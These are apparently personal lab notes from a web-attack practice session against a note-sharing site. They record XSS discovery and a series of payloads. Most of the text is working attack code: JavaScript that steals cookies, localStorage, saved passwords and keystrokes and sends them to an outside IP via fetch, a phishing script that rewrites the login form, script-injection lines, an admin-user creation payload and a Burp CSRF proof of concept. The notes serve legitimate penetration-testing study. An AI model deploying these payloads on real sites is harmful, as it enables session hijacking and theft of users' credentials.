
#### Initial Web Page
- login page exists
- Looks like a group website to take notes and can give `likes` to others posts and `report`
-  able to sign up

![[Pasted image 20250106100350.png]]

##### /login.php
- no login credentials yet
![[Pasted image 20250106100523.png]]

##### /register.php
- creating an account with credentials `testing:testing`
![[Pasted image 20250106100619.png]]

###### /profile.php
- once logged in able to see i am logged in as `testing` and am able to create a note
![[Pasted image 20250106100810.png]]
- creating a new note with `test`
![[Pasted image 20250106100915.png]]
- testing `XSS` with generic payload `<h1>offsec</h1>` and looks like it was properly processed, potentially vulnerable to `XSS`

![[Pasted image 20250106101104.png]]
- also tested an `alert` payload `<script>alert('XSS')</script>` to see if alert popped
- it worked :D
![[Pasted image 20250106101442.png]]
- going to begin testing `XSS` payloads
###### Payload 2 - `STEALING COOKIES`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss_stealing_cookies.js   

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss_stealing_cookies.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.61.62/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![[Pasted image 20250106101854.png]]
- starting `python3` http server
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 15:19:22]-[/home/kali/SUT/192.168.61.62]
â””â”€# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
![[Pasted image 20250106102014.png]]
- payload to test against own kali machine to pull over the `xss_stealing_cookies.js` file
```bash
<script src="http://192.168.49.61:80/xss_stealing_cookies.js"></script>
```
- entering in the script here
![[Pasted image 20250106102205.png]]
- was able to get a hit on my `python3` serverso it did work - now we wait for a potential cookie and can try other `XSS` methods to steal local secrets
![[Pasted image 20250106102232.png]]
- a couple minutes later got a `304` error - possibly executing
![[Pasted image 20250106102354.png]]
- testing `innerHTML`
payload to bypass `innerHTML` - `onerror` method
```bash
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.49.61:80/xss_stealing_cookies.js\'><\/script>');" />
```
- looks like that might have crashed the web page, not the way - had to reset 

------
###### Payload 3 - `STEALING LOCAL SECRETS`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:17]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim localsecrets.js

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:49]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat localsecrets.js  
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.61.62/exfil?data=" + encodedData)

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:57]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
![[Pasted image 20250106103519.png]]
Payload to test against own kali machine 1st
```bash
<script src="http://192.168.49.61:80/localsecrets.js"></script>
```
- nothing came back with this
![[Pasted image 20250106103647.png]]


-----

###### Payload 5 - `STEALING SAVED PASSWORDS`
- if this doesnt work could try with `127.0.0.1`
```bASH
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:35]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim savedpasswords.js

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:46]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat savedpasswords.js 
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
    fetch("http://192.168.61.62:80/k?u=" + u.value + "&p=" + p.value)
}, 5000);
                 
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:49:27]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Payload
```bash
<script src="http://192.168.49.61:80/savedpasswords.js"></script>
```

![[Pasted image 20250106104101.png]]
- we are able to report our own `note` to send it under review - which i believe it will be getting reviewed by an admin? - maybe keylogging
- after sending a report for our note we get a `200` additional error maybe prompting a reaction
![[Pasted image 20250106105057.png]]
- and the review got reset to not under review anymore
![[Pasted image 20250106105132.png]]

###### Payload 4 - `KEYLOGGING`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:14:45]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim keylogging.js

# Make sure to change the IP address
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:09]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat keylogging.js 
function logKey(event){
        fetch("http://192.168.61.62/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:50]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In the search option on the website drop the payload and hit search
payload
```bash
<script src="http://192.168.49.61:80/keylogging.js"></script>
```

--------
- Going to resend all my payloads and report them all to see if i can trigger any hits

stealing cookies
```bash
<script src="http://192.168.49.61:80/xss_stealing_cookies.js"></script>
```
localsecrets
```bash
<script src="http://192.168.49.61:80/localsecrets.js"></script>
```
saved passwords
```bash
<script src="http://192.168.49.61:80/savedpasswords.js"></script>
```
keylogging
```bash
<script src="http://192.168.49.61:80/keylogging.js"></script>
```
- all submitted
![[Pasted image 20250106105554.png]]
- reporting all
![[Pasted image 20250106105618.png]]
- all notes `under review` now prompting an admin to look at them
![[Pasted image 20250106105651.png]]
	- got `200` error after waiting for rev
	- iews
	- still no cookie or anything though this makes me think its a `CSRF` and not an `XSS`
![[Pasted image 20250106110238.png]]


```bash
jQuery.getScript('http://192.168.49.61:80/xsscinco.js')
```

###### Payload 6 - `PHISHING USERS`
phishing.js
```js
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.61"
	document.getElementsByTagName("form")[0].method = "get"
}))
```
Payload
```bash
<script src="http://192.168.49.61:80/phishing.js"></script>
```
#### register.php
- looking at source code there is a `function` that allows logged in users that are marked `isAdmin` to be placed at `admin.php`
- reference to the `mentor` machine 
![[Pasted image 20250106112103.png]]

```js
function login() {
    var username = $('#username').val();
	var password = $('#password').val();
    
	var postBody = "username="+username+"&password="+password;
	fetch('https://'+domain+':8443/api/login', {
		method:'POST',
		mode:'cors',
		credentials:'include',
		headers:{
			'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'
		},
		body:postBody
	})
	.then(response=>response.json())
	.then((data) => {
		if(data.status == "ok") {
			if("token" in data){
				localStorage.setItem('token', data.token);
			}
			if(data.isAdmin === "true") {
				window.location.href="/admin.php";
			} else {
				window.location.href="/profile.php";
			}
			
		} else {
            $('#message').text(data.message);
            $('#message').show();
        }
	});
```

usercreation.js
```js
var xhttp = new XMLHttpRequest(); // to create a request object
var creds = 'email=jbug@offsec.local&password=jbug&name=jbug&username=jbug' // to create string of credentials that were in main.js
xhttp.open("GET", "/admin/users/add?" + creds, true); // preparing to add new user to admin user - calls upon creds variable
xhttp.send(); // sending the request to the server
```
`xss` payload
```bash
<script src="http://192.168.45.231:8000/usercreation.js"></script>
```


adminlogin2.js
```js
var username = $('testing').val();
var password = $('testing').val();
var postBody = "username="+username+"&password="+password;
var isAdmin = true;
```
`xss` payload
```bash
<script src="http://192.168.49.61:80/adminlogin2.js"></script>
```


```bash
{  
"__proto__": {  
"isAdmin": true  
}  
}
```

```bash
http://192.168.61.62/profile.php?isAdmin=true
```

Reverting going to continue later somehow need to change isADmin to true


```bash
<form action="http://192.168.49.61/login" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><br><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><br><button type="submit">Login</button></div></form>
```


#### CSRF
- generated `csrf` from `register page`, going to try to have the admin review this accidentally click it and create the user `hello4` where `isAdmin` = true
```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://127.0.0.1:8443/api/users/create" method="POST">
      <input type="hidden" name="username" value="hello4" />
      <input type="hidden" name="password" value="hello4" />
      <input type="hidden" name="isAdmin" value="true" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
sent as payload
```bash
<script src="http://192.168.49.61:80/isadmin2.js"></script>
```
having payload being reviewed by the `admin`
- can see it being reviewed. taking a break
![[Pasted image 20250106222036.png]]
- nothing came of this admin fixed the review but the user `hello4` was never create
![[Pasted image 20250106230350.png]]